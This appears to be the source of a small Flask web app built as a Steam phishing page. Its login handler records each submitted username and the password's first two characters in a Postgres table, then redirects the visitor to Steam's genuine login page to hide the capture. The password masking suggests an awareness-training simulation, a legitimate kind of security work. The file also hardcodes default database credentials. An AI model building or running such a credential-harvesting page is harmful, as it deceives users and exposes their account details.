from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import time

# sleep for 10 seconds to allow the database to start
time.sleep(10)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql+psycopg2://postgres:postgres@postgres/postgres'

db = SQLAlchemy(app)


class logins(db.Model):
    __tablename__ = 'logins'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(), nullable=False)
    password = db.Column(db.String(), nullable=False)


with app.app_context():
    db.create_all()


@app.get('/')
def index():
    return render_template('index.html')


@app.post('/login')
def login():
    ''' process user/pass form data and add to database '''

    username = request.form['username']
    password = request.form['password']
    # change all characters in password to *, except for the first 2
    password = password[0:2] + '*' * (len(password) - 2)
    new_login = logins(username=username, password=password)
    db.session.add(new_login)
    db.session.commit()
    return redirect('https://store.steampowered.com/login/')
